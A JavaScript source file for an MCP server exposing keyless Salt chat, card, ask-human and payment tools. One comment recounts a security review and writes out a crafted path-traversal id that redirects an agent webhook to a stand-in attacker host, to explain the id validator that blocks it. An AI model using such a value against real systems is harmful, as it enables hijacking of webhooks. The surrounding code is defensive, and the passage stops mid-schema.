// The KEYLESS toolset for the hosted (OAuth) MCP endpoint -- see the "Remote
// MCP OAuth contract (K5)" in
// design-fleet/runs/2026-09-17-distribution/LANES.md.
//
// Every tool here acts AS the connected client's keyless agent: a Salt
// Agent account the human owns, with a public key on file (so other
// members can encrypt TO it) but NO private key anywhere -- Salt's
// servers never mint one, and this process never holds one either. That
// has one hard consequence threaded through every tool below: this
// server can encrypt outgoing text (send_message) but can never decrypt
// anything, including its own past messages, a "self-copy", or any
// message history. Every tool description says so plainly, so a model
// calling these tools doesn't hallucinate a `list_chats`/`send_message`
// pair into "reading" a conversation.
//
// Distinct from src/annotations.mjs's TOOL_ANNOTATIONS, which is
// cross-checked against salt-agent-sdk's REAL action catalog (see
// tests/annotations.test.mjs) -- these tools are NOT SDK actions (the SDK
// assumes a locally-held private key throughout: encryptFor is the one
// piece of salt-agent-sdk's crypto module this file borrows, since it
// only ever needs recipients' PUBLIC keys). Keeping them in a separate
// map means a new SDK action never has to justify itself against a
// keyless contract it was never designed for, and vice versa.

import pkg from "salt-agent-sdk";
import { SaltBearerApiError } from "./salt-bearer-client.mjs";
import { CARD_UI_RESOURCE_URI } from "./card-ui.mjs";
import { ROOM_TOOL_METADATA, runRoomTool } from "./room-tools.mjs";

const { encryptFor } = pkg;

const KEYLESS_NOTE =
  "This connection is keyless: it has no private key, so it can never read chat history or message text, including its own past messages.";

/** Scopes the K5 contract defines (salt-api's OAuth consent screen, `chat` / `money` toggles). */
export const SCOPES = { CHAT: "chat", MONEY: "money" };

const SCOPE_REFUSAL_MESSAGE = {
  [SCOPES.CHAT]: "This connection wasn't given permission to do that in chat.",
  [SCOPES.MONEY]: "This connection wasn't given permission to request money.",
};

// --- small pure helpers -----------------------------------------------

function requireString(value, field) {
  const s = typeof value === "string" ? value.trim() : "";
  if (!s) throw new Error(`${field} is required.`);
  return s;
}

// Every Salt record id is a uuid (salt-api's schema uses `id: :uuid`
// everywhere); an integer form is accepted too since some ids elsewhere in
// the ecosystem are still plain integers, and this check is about shape,
// not about knowing salt-api's schema by heart. A 2026-09-18 security
// review found `update_card`'s `card_id` reaching
// src/salt-bearer-client.mjs completely unvalidated, so a crafted value
// like `../agents/callback?webhook=https://attacker.example/hook` turned
// a PATCH to `/api/v1/cards/:id` into a PATCH to `/api/v1/agents/callback`
// instead (a path traversal that could have redirected a real agent's
// webhook). This is the FIRST of two independent layers that close it --
// the second is salt-bearer-client.mjs's own encodeURIComponent on every
// path-interpolated value, which stays even though this check should
// never let anything past it that needed encoding in the first place.
const UUID_RE = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
const INTEGER_ID_RE = /^[0-9]+$/;

function assertPlainId(value, field) {
  const s = requireString(value, field);
  if (!UUID_RE.test(s) && !INTEGER_ID_RE.test(s)) {
    throw new Error(`${field} must be a plain Salt id (a uuid or an integer) -- refusing "${s.slice(0, 60)}".`);
  }
  return s;
}

/**
 * Builds ask_human's/get_ask_result's `{answer, ...}` payload from one
 * matched card interaction. `transfer_request_id`/`transfer_request_status`
 * ride along when the interaction carries them -- salt-api's
 * GET /api/v1/cards/:id only sets them on a pay tap, live status included
 * (see the route's contract), which is genuinely new information the old
 * socket-outbox event body never carried. ask_human's own cards are plain
 * option buttons today, never `type: "pay"`, so this is normally a no-op;
 * it costs nothing to pass through and saves the next card type that
 * reuses this poll from needing its own answer-shaping code.
 */
function answerFromInteraction(actionMap, interaction) {
  const answer = actionMap[interaction.action_id] ?? interaction.value ?? interaction.action_id;
  const result = { answer };
  if (interaction.transfer_request_id) {
    result.transfer_request_id = interaction.transfer_request_id;
    result.transfer_request_status = interaction.transfer_request_status;
  }
  return result;
}

/**
 * Best-effort: once an ask has been answered, rewrite its card to the question
 * plus "Answered: <answer>" so the person sees their tap registered (same
 * shape the SDKs write). Never throws and never fails the tool -- the agent
 * already has its answer. Skipped when the ask_id predates `question`.
 */
async function markCardAnswered(rest, bearerToken, cardId, question, answer) {
  if (!cardId || typeof question !== "string" || !question) return;
  try {
    await rest.updateCard(bearerToken, cardId, [
      { type: "section", text: question.slice(0, 2000) },
      { type: "section", text: `Answered: ${String(answer).slice(0, 200)}` },
    ]);
  } catch {
    // The card stays as it was; the answer is still returned.
  }
}

function findMemberByHandle(members, handle) {
  const needle = String(handle || "").trim().toLowerCase().replace(/^@/, "");
  return (Array.isArray(members) ? members : []).find((m) => String(m.username || "").toLowerCase() === needle);
}

/**
 * Picks a wallet the human explicitly attached to THIS OAuth grant for the
 * given chain/testnet. A keyless agent owns NO wallet of its own, ever --
 * that is a permanent design decision (a K5 security review said so
 * explicitly: "Never propose giving keyless agents their own wallet"),
 * not a gap waiting to be filled in. Every money tool below therefore
 * spends only a wallet the human chose to expose when they granted the
 * `money` scope at Salt's consent screen (`GET /api/v1/oauth2/grant` ->
 * `{scopes, wallets: [{id, chain, testnet, label}]}`). `grant` here is
 * the SAME object src/http.mjs's per-request token validation already
 * fetched to confirm the bearer is real (see createTokenValidator) -- no
 * second call to salt-api, and no reading of `/api/v1/wallets` at all
 * (that endpoint lists wallets Salt itself has no reason to let a
 * connected, potentially third-party MCP client enumerate).
 */
function requireGrantedWalletId(grant, { chain, testnet }) {
  const wallets = Array.isArray(grant?.wallets) ? grant.wallets : [];
  const match = wallets.find(
    (w) => String(w.chain || "").toLowerCase() === String(chain || "").toLowerCase() && Boolean(w.testnet) === Boolean(testnet)
  );
  if (!match) {
    const network = testnet ? `${chain} testnet` : chain;
    throw new Error(`This connection can't receive payments on ${network}. The owner can add a wallet in Salt › Settings › Connected apps.`);
  }
  return match.id;
}

/**
 * Decimal-safe-enough multiply for line-item subtotals (qty x unit_price).
 * salt-api's line_items_shape validator re-checks this exactly with
 * BigDecimal, so this only needs to reproduce ordinary decimal arithmetic
 * for realistic prices/quantities -- same tradeoff salt-agent-sdk's
 * sendInvoice already accepts (toFixed then trim), not a full bignum
 * implementation.
 */
function multiplyDecimalStrings(qtyStr, unitPriceStr) {
  const product = Number(qtyStr) * Number(unitPriceStr);
  return product.toFixed(12).replace(/0+$/, "").replace(/\.$/, "") || "0";
}

function sumDecimalStrings(strings) {
  const total = strings.reduce((sum, s) => sum + Number(s), 0);
  return total.toFixed(12).replace(/0+$/, "").replace(/\.$/, "") || "0";
}

function encodeAskId(payload) {
  return Buffer.from(JSON.stringify(payload), "utf8").toString("base64url");
}

function decodeAskId(askId) {
  try {
    return JSON.parse(Buffer.from(String(askId), "base64url").toString("utf8"));
  } catch {
    throw new Error("That ask_id isn't valid or has expired.");
  }
}

// ask_human's and get_ask_result's polling budgets. FIXED in code, never
// from tool arguments -- a 2026-09-18 security review found the earlier
// `_maxTotalMs` escape hatch (meant to be test-only) was read straight off
// the wire-facing `input` object, so any real MCP client could set it and
// control how long/how hard this server hammered salt-api per call. There
// is no argument named `_maxTotalMs` (or anything else) in either tool's
// inputSchema any more, and these functions never look for one.
const ASK_HUMAN_MAX_MS = 50_000;
const GET_ASK_RESULT_MAX_MS = 2_000;

// The floor on how often an EMPTY poll may repeat, even if salt-api
// answers instantly (2026-09-19 availability review, N2). K2's own "Short
// poll" contract has salt-api wait up to ~2s server-side when there's
// nothing new, which normally paces this loop for free -- but nothing
// stops a fast/cached/misbehaving response from coming back with
// `interactions: []` in a few milliseconds, and without a floor of our
// own this loop would then spin as fast as the network round-trip
// allows, hammering salt-api far harder than the K2 contract's own
// pacing intends. Only applies when a poll comes back with NO
// interactions at all (not just none matching `matches`) -- any real
// interaction is a sign of real activity, worth checking again for
// promptly.
const MIN_EMPTY_POLL_MS = 1_000;

/** Interruptible sleep -- resolves early (never rejects) if `signal` aborts mid-wait. */
function sleep(ms, signal) {
  return new Promise((resolve) => {
    if (signal?.aborted) return resolve();
    const timer = setTimeout(resolve, ms);
    signal?.addEventListener?.("abort", () => { clearTimeout(timer); resolve(); }, { once: true });
  });
}

/**
 * Short-polls ONE card's own interaction log (salt-api 0.96.0,
 * GET /api/v1/cards/:id) for an interaction matching `matches` (any
 * interaction at all, when `matches` is omitted), up to `maxTotalMs` of
 * wall time (always one of the two constants above in production; tests
 * pass their own small budgets directly to this exported function, never
 * through a tool argument). `signal` (an AbortSignal) stops the loop
 * early -- wired in src/http.mjs to the underlying HTTP request's own
 * `res.on("close")`, so a client that hangs up mid-ask_human doesn't
 * leave this server polling salt-api for up to another 50s on its
 * behalf.
 *
 * This reads the CARD directly, never the shared socket-mode outbox
 * (GET /api/v1/agent/updates) the previous version of this function
 * drained. That outbox has exactly ONE forward-only cursor PER AGENT
 * (design-fleet/runs/2026-09-17-distribution/FOLLOWUPS.md): two
 * concurrent asks for the same agent, or an ask running beside any other
 * listener on the same outbox, consumed each other's answers and could
 * strand an ask forever, because draining the outbox for one card's
 * interaction also advanced the cursor past every OTHER row it read.
 * Reading one card by id is idempotent and shares nothing with any other
 * ask -- two asks on the same agent now each poll their own card and
 * never touch each other's cursor.
 *
 * `after` is an interaction id (never a numeric outbox offset); passed
 * straight through to `rest.getCard`, which forwards it as the `after`
 * query param salt-api compares interactions against (an unrecognised
 * value fails OPEN server-side -- the full list, never a 500 -- so a
 * stale or corrupt cursor degrades to "reread everything" rather than
 * erroring).
 *
 * Two pacing guards, both from the 2026-09-19 availability review: an
 * empty poll (no interactions at all) is followed by a sleep long enough
 * to make that iteration take at least `minEmptyPollMs` in total (see
 * MIN_EMPTY_POLL_MS's comment for why) -- note this is about the response
 * being literally empty, not about nothing MATCHING `matches`, since a
 * card with real (non-matching) activity is a sign of real activity worth
 * checking again for promptly; a 429 from `rest.getCard` (this server's
 * OWN per-IP limiter, or salt-api's) is honoured via `err.retryAfterSeconds`
 * (see SaltBearerApiError/salt-bearer-client.mjs) rather than being
 * retried immediately or treated as fatal.
 */
export async function pollForCardInteraction(rest, bearerToken, { cardId, after, maxTotalMs, signal, minEmptyPollMs = MIN_EMPTY_POLL_MS, matches }) {
  const deadline = Date.now() + maxTotalMs;
  let cursor = after;
  do {
    if (signal?.aborted) return { found: false, cursor };
    const startedAt = Date.now();
    let response;
    try {
      response = await rest.getCard(bearerToken, cardId, { after: cursor, signal });
    } catch (err) {
      if (err instanceof SaltBearerApiError && err.status === 429) {
        const retryAfterMs = Math.max(1, Number(err.retryAfterSeconds) || 1) * 1000;
        await sleep(retryAfterMs, signal);
        continue;
      }
      throw err;
    }
    const interactions = Array.isArray(response?.interactions) ? response.interactions : [];
    // Newest first, per the route's contract -- advance the cursor to the
    // newest interaction id seen regardless of whether it matches, so a
    // resumed poll (get_ask_result) never re-reads a row it has already
    // looked at and rejected.
    if (interactions.length > 0 && interactions[0]?.id !== undefined) cursor = interactions[0].id;
    const match = matches ? interactions.find((i) => matches(i)) : interactions[0];
    if (match) return { found: true, body: match, cursor };
    if (interactions.length === 0) {
      const elapsed = Date.now() - startedAt;
      if (elapsed < minEmptyPollMs) await sleep(minEmptyPollMs - elapsed, signal);
    }
  } while (Date.now() < deadline && !signal?.aborted);
  return { found: false, cursor };
}

// --- tool implementations ----------------------------------------------

async function findPeopleAndAgents(rest, bearerToken, input) {
  const query = requireString(input.query, "query");
  const [contacts, agents] = await Promise.all([
    rest.searchContacts(bearerToken, query).catch(() => []),
    rest.listAgentsDirectory(bearerToken).catch(() => []),
  ]);
  const needle = query.toLowerCase();
  const matchedAgents = agents.filter(
    (a) => String(a.username || "").toLowerCase().includes(needle) || String(a.display_name || "").toLowerCase().includes(needle)
  );
  const seen = new Set();
  const results = [];
  for (const person of [...contacts, ...matchedAgents]) {
    const id = String(person.id);
    if (seen.has(id)) continue;
    seen.add(id);
    results.push({
      id: person.id,
      username: person.username,
      display_name: person.display_name,
      account_type: person.account_type || (matchedAgents.includes(person) ? "Agent" : "User"),
    });
    if (results.length >= 20) break;
  }
  return { results };
}

async function openChat(rest, bearerToken, input) {
  const handle = requireString(input.handle, "handle");
  const needle = handle.toLowerCase().replace(/^@/, "");
  const [contacts, agents] = await Promise.all([
    rest.searchContacts(bearerToken, handle).catch(() => []),
    rest.listAgentsDirectory(bearerToken).catch(() => []),
  ]);
  const person =
    contacts.find((p) => String(p.username || "").toLowerCase() === needle) ||
    agents.find((p) => String(p.username || "").toLowerCase() === needle);
  if (!person) throw new Error(`No one on Salt goes by @${handle}.`);
  const chat = await rest.createOrGetChat(bearerToken, person.id);
  // POST /api/v1/chats answers the chat payload itself (id/name/users at the
  // top level); tolerate the {session} wrapper too.
  const s = chat?.session || chat || {};
  const members = s.users || [];
  return {
    chat_id: s.id,
    name: s.name || null,
    members: members.map((m) => ({ id: m.id, username: m.username, display_name: m.display_name, account_type: m.account_type })),
  };
}

async function listChats(rest, bearerToken) {
  const chats = await rest.listChats(bearerToken);
  return {
    // GET /api/v1/chats rows nest the chat under `session`.
    chats: chats.map((row) => {
      const chat = row.session || row;
      return {
      id: chat.id,
      name: chat.name || null,
      members: (chat.users || chat.members || []).map((m) => ({
        id: m.id,
        username: m.username,
        display_name: m.display_name,
        account_type: m.account_type,
      })),
      unread_count: chat.unread_count ?? 0,
      };
    }),
  };
}

async function sendMessage(rest, bearerToken, input) {
  const chatId = assertPlainId(input.chat_id, "chat_id");
  const text = requireString(input.text, "text");
  const chat = await rest.getChat(bearerToken, chatId);
  const members = chat?.session?.users || chat?.users || [];
  // EVERY member, observers included -- never filtered. A human owner
  // observes a delegation chat PRECISELY so they can audit it (CLAUDE.md's
  // "Delegation observability"); excluding observers here, as an earlier
  // version of this function did, silently defeated that for any message a
  // keyless agent sent. A 2026-09-18 security review caught it.
  const missingKey = members.find((m) => !m.public_key);
  if (missingKey) {
    throw new Error(`Can't send: ${missingKey.display_name || missingKey.username || "a member"} hasn't set up an encryption key yet.`);
  }
  const ciphertext = await encryptFor(text, members.map((m) => m.public_key));
  const result = await rest.postMessage(bearerToken, chatId, ciphertext);
  return { sent: true, message_id: result?.id ?? null };
}

async function postCardTool(rest, bearerToken, input) {
  const chatId = assertPlainId(input.chat_id, "chat_id");
  const blocks = Array.isArray(input.blocks) && input.blocks.length > 0 ? input.blocks : null;
  if (!blocks) throw new Error("blocks is required (at least one card block).");
  const result = await rest.postCard(bearerToken, chatId, blocks, input.text || "");
  return { card_id: result?.resource_id ?? result?.id ?? null, message_id: result?.id ?? result?.message_id ?? null, blocks, text: input.text || "" };
}

async function updateCardTool(rest, bearerToken, input) {
  const cardId = assertPlainId(input.card_id, "card_id");
  const blocks = Array.isArray(input.blocks) && input.blocks.length > 0 ? input.blocks : null;
  if (!blocks) throw new Error("blocks is required (at least one card block).");
  await rest.updateCard(bearerToken, cardId, blocks);
  return { updated: true, card_id: cardId, blocks };
}

async function askHuman(rest, bearerToken, input, ctx) {
  const chatId = assertPlainId(input.chat_id, "chat_id");
  const to = requireString(input.to, "to");
  const question = requireString(input.question, "question");
  const options = Array.isArray(input.options) ? input.options.filter((o) => typeof o === "string" && o.trim()) : [];
  if (options.length < 2 || options.length > 5) throw new Error("options must have 2..5 choices.");

  const chat = await rest.getChat(bearerToken, chatId);
  const members = chat?.session?.users || chat?.users || [];
  const human = findMemberByHandle(members, to);
  if (!human) throw new Error(`@${to.replace(/^@/, "")} isn't in this chat.`);

  const actionMap = {};
  const elements = options.map((label, i) => {
    const actionId = `opt_${i}`;
    actionMap[actionId] = label;
    return { type: "button", action_id: actionId, label: label.slice(0, 40), restricted_to: [human.id] };
  });
  const blocks = [{ type: "section", text: question.slice(0, 2000) }, { type: "actions", elements }];
  const posted = await rest.postCard(bearerToken, chatId, blocks, question.slice(0, 200));
  const cardId = posted?.resource_id ?? posted?.id;

  // `ctx.maxTotalMsOverride` (like `ctx.signal`/`ctx.grant`) is internal
  // plumbing, never wire-facing input -- src/http.mjs never sets it, only
  // tests calling runKeylessTool directly do, to exercise the "nobody
  // answered in time" path without a real 50s wait. There is no argument
  // by this or any other name in ask_human's inputSchema, and nothing
  // reads one off `input`; that's the exact gap a 2026-09-18 security
  // review found (a client-supplied `_maxTotalMs` was honoured).
  //
  // `matches` picks the answer out of this card's OWN interaction log:
  // the newest interaction whose action_id is one of THIS ask's option
  // buttons (opt_0.. -- see `actionMap` above). Filtering on that, rather
  // than trusting "any interaction on this card is the answer," is a
  // second, cheap guard on top of `restricted_to` (which already limits
  // who can tap) and costs nothing since polling by card id already means
  // no other ask's traffic can appear here at all.
  const poll = await pollForCardInteraction(rest, bearerToken, {
    cardId,
    maxTotalMs: ctx?.maxTotalMsOverride ?? ASK_HUMAN_MAX_MS,
    signal: ctx?.signal,
    minEmptyPollMs: ctx?.minEmptyPollMsOverride ?? MIN_EMPTY_POLL_MS,
    matches: (interaction) => Object.prototype.hasOwnProperty.call(actionMap, interaction?.action_id),
  });
  // The ask_id is opaque to the model: just enough to resume this exact
  // poll later (the card, its option map, and the newest interaction id
  // already seen -- `after`, never the old outbox's numeric cursor).
  const askId = encodeAskId({ cardId, actionMap, question: question.slice(0, 2000), after: poll.cursor ?? null });
  if (!poll.found) return { status: "pending", ask_id: askId };

  const answered = answerFromInteraction(actionMap, poll.body);
  await markCardAnswered(rest, bearerToken, cardId, question.slice(0, 2000), answered.answer);
  return { ...answered, ask_id: askId };
}

async function getAskResult(rest, bearerToken, input, ctx) {
  const askId = requireString(input.ask_id, "ask_id");
  const state = decodeAskId(askId);
  const actionMap = state.actionMap || {};
  const poll = await pollForCardInteraction(rest, bearerToken, {
    cardId: state.cardId,
    after: state.after ?? undefined,
    maxTotalMs: ctx?.maxTotalMsOverride ?? GET_ASK_RESULT_MAX_MS,
    signal: ctx?.signal,
    minEmptyPollMs: ctx?.minEmptyPollMsOverride ?? MIN_EMPTY_POLL_MS,
    matches: (interaction) => Object.prototype.hasOwnProperty.call(actionMap, interaction?.action_id),
  });
  const nextAskId = encodeAskId({ cardId: state.cardId, actionMap, question: state.question, after: poll.cursor ?? state.after ?? null });
  if (!poll.found) return { status: "pending", ask_id: nextAskId };
  const answered = answerFromInteraction(actionMap, poll.body);
  await markCardAnswered(rest, bearerToken, state.cardId, state.question, answered.answer);
  return { ...answered, ask_id: nextAskId };
}

async function requestPayment(rest, bearerToken, input, ctx) {
  const chatId = assertPlainId(input.chat_id, "chat_id");
  const to = requireString(input.to, "to");
  const amount = requireString(input.amount, "amount");
  const chain = requireString(input.chain, "chain");
  const testnet = Boolean(input.testnet);
  const chat = await rest.getChat(bearerToken, chatId);
  const members = chat?.session?.users || chat?.users || [];
  const receiver = findMemberByHandle(members, to);
  if (!receiver) throw new Error(`@${to.replace(/^@/, "")} isn't in this chat.`);
  const walletId = requireGrantedWalletId(ctx?.grant, { chain, testnet });
  const request = await rest.createTransferRequest(bearerToken, {
    chatId,
    receiverId: receiver.id,
    walletId,
    amount,
    message: input.message || "",
  });
  return { request_id: request.id, status: request.status, amount: request.amount };
}

async function sendInvoice(rest, bearerToken, input, ctx) {
  const chatId = assertPlainId(input.chat_id, "chat_id");
  const to = requireString(input.to, "to");
  const chain = requireString(input.chain, "chain");
  const testnet = Boolean(input.testnet);
  const items = Array.isArray(input.line_items) ? input.line_items : [];
  if (items.length === 0) throw new Error("line_items is required.");
  const chat = await rest.getChat(bearerToken, chatId);
  const members = chat?.session?.users || chat?.users || [];
  const receiver = findMemberByHandle(members, to);
  if (!receiver) throw new Error(`@${to.replace(/^@/, "")} isn't in this chat.`);

  const lineItems = items.map((item) => {
    const name = requireString(item.name, "line_items[].name");
    const qty = requireString(String(item.qty), "line_items[].qty");
    const unitPrice = requireString(String(item.unit_price), "line_items[].unit_price");
    return { name, qty, unit_price: unitPrice, subtotal: multiplyDecimalStrings(qty, unitPrice) };
  });
  const amount = sumDecimalStrings(lineItems.map((i) => i.subtotal));
  const walletId = requireGrantedWalletId(ctx?.grant, { chain, testnet });
  const invoice = await rest.createTransferRequest(bearerToken, {
    chatId,
    receiverId: receiver.id,
    walletId,
    amount,
    message: lineItems.map((i) => i.name).join(", ").slice(0, 100),
    requestType: "invoice",
    lineItems,
    dueAt: input.due_date,
  });
  return { request_id: invoice.id, amount, status: invoice.status };
}

async function getPaymentStatus(rest, bearerToken, input) {
  const requestId = assertPlainId(input.request_id, "request_id");
  const requests = await rest.listTransferRequests(bearerToken);
  const found = requests.find((r) => String(r.id) === requestId);
  if (!found) throw new Error("No payment request found with that id.");
  return {
    id: found.id,
    status: found.status,
    amount: found.amount,
    request_type: found.request_type || "request",
    last_failed_reason: found.last_failed_reason || null,
  };
}

async function listProductsTool(rest, bearerToken, input) {
  const sellerId = input.seller_id ? assertPlainId(input.seller_id, "seller_id") : undefined;
  const products = await rest.listProducts(bearerToken, sellerId);
  return { products };
}

async function createProductTool(rest, bearerToken, input, ctx) {
  const chain = requireString(input.chain, "chain");
  const testnet = Boolean(input.testnet);
  const walletId = requireGrantedWalletId(ctx?.grant, { chain, testnet });
  const { chain: _chain, testnet: _testnet, ...productFields } = input;
  const product = await rest.createProduct(bearerToken, { ...productFields, wallet_id: walletId });
  return { created: true, product };
}

async function listSaltAgents(rest, bearerToken) {
  const agents = await rest.listAgentsDirectory(bearerToken);
  return { agents: agents.map((a) => ({ id: a.id, username: a.username, display_name: a.display_name, category: a.category })) };
}

// --- tool catalog --------------------------------------------------------

const MONEY_HINT = "The host should confirm the amount and counterparty with the human before calling this.";
const SEND_HINT = "The host should confirm the content with the human before calling this.";

/**
 * @typedef {{
 *   name: string,
 *   title: string,
 *   description: string,
 *   scope: "chat" | "money",
 *   inputSchema: object,
 *   outputSchema?: object,
 *   annotations: { readOnlyHint: boolean, destructiveHint: boolean, idempotentHint: boolean, openWorldHint: boolean },
 *   ui?: { resourceUri: string },
 *   execute: (rest: object, bearerToken: string, input: object) => Promise<object>,
 * }} KeylessTool
 */

/** @type {KeylessTool[]} */
export const KEYLESS_TOOLS = [
  {
    name: "find_people_and_agents",
    title: "Find People and Agents",
    description: `Search Salt's contacts and the public agent directory by name or @handle. ${KEYLESS_NOTE}`,
    scope: SCOPES.CHAT,
    inputSchema: {
      type: "object",
      properties: { query: { type: "string", description: "A name or @handle to search for." } },
      required: ["query"],
    },
    outputSchema: {
      type: "object",
      properties: {
        results: {
          type: "array",
          items: {
            type: "object",
            properties: {
              id: { type: "string" },
              username: { type: "string" },
              display_name: { type: "string" },
              account_type: { type: "string", enum: ["User", "Agent"] },
            },
          },
        },
      },
      required: ["results"],
    },
    annotations: { readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: true },
    execute: findPeopleAndAgents,
  },
  {
    name: "open_chat",
    title: "Open Chat",
    description: `Opens (or reuses) a 1:1 chat with a person or agent by @handle. ${KEYLESS_NOTE}`,
    scope: SCOPES.CHAT,
    inputSchema: {
      type: "object",
      properties: { handle: { type: "string", description: "The @handle of the person or agent to open a chat with." } },
      required: ["handle"],
    },
    outputSchema: {
      type: "object",
      properties: {
        chat_id: { type: "string" },
        name: { type: ["string", "null"] },
        members: { type: "array", items: { type: "object" } },
      },
      required: ["chat_id"],
    },
    annotations: { readOnlyHint: false, destructiveHint: false, idempotentHint: true, openWorldHint: true },
    execute: openChat,
  },
  {
    name: "list_chats",
    title: "List Chats",
    description: `Lists this connection's chats -- names, members, and unread counts only, never message content. ${KEYLESS_NOTE}`,
    scope: SCOPES.CHAT,
    inputSchema: { type: "object", properties: {} },
    outputSchema: {
      type: "object",
      properties: { chats: { type: "array", items: { type: "object" } } },
      required: ["chats"],
    },
    annotations: { readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: true },
    execute: (rest, bearerToken) => listChats(rest, bearerToken),
  },
  {
    name: "send_message",
    title: "Send Message",
    description:
      `Sends a real, visible message into a Salt chat, encrypted to every member's public key. ${KEYLESS_NOTE} ` +
      `Refuses if any member hasn't set up an encryption key. ${SEND_HINT}`,
    scope: SCOPES.CHAT,
    inputSchema: {
      type: "object",
      properties: {
        chat_id: { type: "string" },
        text: { type: "string", description: "The message to send, plain text." },
      },
      required: ["chat_id", "text"],
    },
    outputSchema: { type: "object", properties: { sent: { type: "boolean" }, message_id: { type: ["string", "null"] } }, required: ["sent"] },
    annotations: { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: true },
    execute: sendMessage,
  },
  // Open rooms (2026-09-22): a chat with no end-to-end encryption at all --
  // the one case a keyless connection genuinely CAN read content, since
  // there's no PGP to be missing a private key for. Metadata (name/
  // description/schemas/annotations) lives once in src/room-tools.mjs,
  // shared with the local/stdio server's own copy of these same four
  // tools (src/index.mjs) -- only `execute` differs, binding
  // salt-bearer-client.mjs's rawRequest to this call's bearer token.
  ...ROOM_TOOL_METADATA.map((meta) => ({
    ...meta,
    scope: SCOPES.CHAT,
    execute: (rest, bearerToken, input) => runRoomTool(meta.name, input, { request: (method, path, body) => rest.rawRequest(bearerToken, method, path, body) }),
  })),
  {
    name: "post_card",
    title: "Post Card",
    description:
      "Posts a declarative blocks card (section/fields/image/divider/actions) into a chat -- polls, order status, menus, anything tappable that isn't free money movement. " +
      `${SEND_HINT} ${KEYLESS_NOTE}`,
    scope: SCOPES.CHAT,
    inputSchema: {
      type: "object",
      properties: {
        chat_id: { type: "string" },
        blocks: { type: "array", description: "Card blocks: section, fields, image, divider, actions.", items: { type: "object" } },
        text: { type: "string", description: "A short plaintext caption/fallback for the card's chat bubble." },
      },
      required: ["chat_id", "blocks"],
    },
    outputSchema: {
      type: "object",
      properties: { card_id: { type: ["string", "null"] }, message_id: { type: ["string", "null"] }, blocks: { type: "array" }, text: { type: "string" } },
      required: ["card_id"],
    },
    annotations: { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: true },
    ui: { resourceUri: CARD_UI_RESOURCE_URI },
    execute: postCardTool,
  },
  {
    name: "update_card",
    title: "Update Card",
    description: `Replaces a card this connection owns with new blocks -- re-broadcasts live into everyone's bubble. ${KEYLESS_NOTE}`,
    scope: SCOPES.CHAT,
    inputSchema: {
      type: "object",
      properties: {
        card_id: { type: "string" },
        blocks: { type: "array", items: { type: "object" } },
      },
      required: ["card_id", "blocks"],
    },
    outputSchema: {
      type: "object",
      properties: { updated: { type: "boolean" }, card_id: { type: "string" }, blocks: { type: "array" } },
      required: ["updated", "card_id"],
    },
    annotations: { readOnlyHint: false, destructiveHint: true, idempotentHint: true, openWorldHint: true },
    ui: { resourceUri: CARD_UI_RESOURCE_URI },
    execute: updateCardTool,
  },
  {
    name: "ask_human",
    title: "Ask Human",
    description:
      "Posts a card with option buttons restricted to one chosen chat member, then waits (up to ~50s) for their tap. " +
      "Get chat_id from open_chat (with the human's @handle; the person who connected this app is reachable that way) or list_chats first. " +
      "Returns their answer, or {status: 'pending', ask_id} to keep checking later with get_ask_result. " +
      `${KEYLESS_NOTE}`,
    scope: SCOPES.CHAT,
    inputSchema: {
      type: "object",
      properties: {
        chat_id: { type: "string" },
        to: { type: "string", description: "The @handle of the chat member being asked -- only they can tap." },
        question: { type: "string" },
        options: { type: "array", items: { type: "string" }, minItems: 2, maxItems: 5 },
      },
      required: ["chat_id", "to", "question", "options"],
    },
    outputSchema: {
      type: "object",
      properties: {
        answer: { type: "string" },
        status: { type: "string", enum: ["pending"] },
        ask_id: { type: "string" },
        transfer_request_id: { type: "string", description: "Only present when the tap was a pay button." },
        transfer_request_status: { type: "string", description: "The pay tap's live transfer request status, e.g. \"Pending\" or \"Confirmed\"." },
      },
      required: ["ask_id"],
    },
    annotations: { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: true },
    execute: askHuman,
  },
  {
    name: "get_ask_result",
    title: "Get Ask Result",
    description: "Checks again for the answer to a pending ask_human call, using the ask_id it returned.",
    scope: SCOPES.CHAT,
    inputSchema: { type: "object", properties: { ask_id: { type: "string" } }, required: ["ask_id"] },
    outputSchema: {
      type: "object",
      properties: {
        answer: { type: "string" },
        status: { type: "string", enum: ["pending"] },
        ask_id: { type: "string" },
        transfer_request_id: { type: "string", description: "Only present when the tap was a pay button." },
        transfer_request_status: { type: "string", description: "The pay tap's live transfer request status, e.g. \"Pending\" or \"Confirmed\"." },
      },
      required: ["ask_id"],
    },
    annotations: { readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: true },
    execute: getAskResult,
  },
  {
    name: "request_payment",
    title: "Request Payment",
    description:
      "Creates a real, payable money request from a chat member, paid into a wallet the human " +
      `attached to this connection's grant for the given chain (never a wallet of this agent's own -- it has none). ${MONEY_HINT}`,
    scope: SCOPES.MONEY,
    inputSchema: {
      type: "object",
      properties: {
        chat_id: { type: "string" },
        to: { type: "string", description: "The @handle of the chat member being asked to pay." },
        amount: { type: "string", description: "A decimal amount, e.g. \"12.50\"." },
        chain: { type: "string", description: "The chain to receive on, e.g. \"ethereum\", \"base\" -- must match a wallet granted to this connection." },
        testnet: { type: "boolean", description: "True for the testnet wallet on that chain. Defaults to false (mainnet)." },
        message: { type: "string" },
      },
      required: ["chat_id", "to", "amount", "chain"],
    },
    outputSchema: {
      type: "object",
      properties: { request_id: { type: "string" }, status: { type: "string" }, amount: { type: "string" } },
      required: ["request_id"],
    },
    annotations: { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: true },
    execute: requestPayment,
  },
  {
    name: "send_invoice",
    title: "Send Invoice",
    description:
      "Sends an itemized invoice to a chat member on the same payment rail as request_payment, into a wallet " +
      `the human attached to this connection's grant for the given chain. ${MONEY_HINT}`,
    scope: SCOPES.MONEY,
    inputSchema: {
      type: "object",
      properties: {
        chat_id: { type: "string" },
        to: { type: "string" },
        chain: { type: "string", description: "The chain to receive on -- must match a wallet granted to this connection." },
        testnet: { type: "boolean", description: "True for the testnet wallet on that chain. Defaults to false (mainnet)." },
        line_items: {
          type: "array",
          items: {
            type: "object",
            properties: {
              name: { type: "string" },
              qty: { type: ["string", "number"] },
              unit_price: { type: ["string", "number"] },
